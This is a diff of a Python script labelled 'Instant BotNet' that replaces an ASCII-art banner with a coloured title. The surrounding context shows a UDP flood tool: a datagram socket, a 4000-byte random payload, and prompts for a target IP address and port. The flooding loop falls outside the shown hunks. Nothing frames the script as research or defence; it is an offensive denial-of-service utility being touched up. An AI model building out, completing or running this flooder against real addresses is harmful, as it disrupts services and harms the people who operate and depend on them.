@@ -3,6 +3,9 @@ import sys
 import time
 import socket
 import random
+import colorama
+from colorama import Fore
+from colorama import Style
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -10,25 +13,8 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(4000)
 
 os.system("clear")
-print(""" /$$$$$$                       /$$                           /$$    
-|_  $$_/                      | $$                          | $$    
-  | $$   /$$$$$$$   /$$$$$$$ /$$$$$$    /$$$$$$  /$$$$$$$  /$$$$$$  
-  | $$  | $$__  $$ /$$_____/|_  $$_/   |____  $$| $$__  $$|_  $$_/  
-  | $$  | $$  \ $$|  $$$$$$   | $$      /$$$$$$$| $$  \ $$  | $$    
-  | $$  | $$  | $$ \____  $$  | $$ /$$ /$$__  $$| $$  | $$  | $$ /$$
- /$$$$$$| $$  | $$ /$$$$$$$/  |  $$$$/|  $$$$$$$| $$  | $$  |  $$$$/
-|______/|__/  |__/|_______/    \___/   \_______/|__/  |__/   \___/  
-                                                                    
-                                                                    
-                                                                    
- /$$$$$$$              /$$                           /$$            
-| $$__  $$            | $$                          | $$            
-| $$  \ $$  /$$$$$$  /$$$$$$   /$$$$$$$   /$$$$$$  /$$$$$$          
-| $$$$$$$  /$$__  $$|_  $$_/  | $$__  $$ /$$__  $$|_  $$_/          
-| $$__  $$| $$  \ $$  | $$    | $$  \ $$| $$$$$$$$  | $$            
-| $$  \ $$| $$  | $$  | $$ /$$| $$  | $$| $$_____/  | $$ /$$        
-| $$$$$$$/|  $$$$$$/  |  $$$$/| $$  | $$|  $$$$$$$  |  $$$$/        
-|_______/  \______/    \___/  |__/  |__/ \_______/   \___/          """)
+
+print(Fore.RED + "Instant BotNet" + Style.RESET_ALL)
 
 ip = raw_input("Ip Adress: ")
 port = input("Port: ")
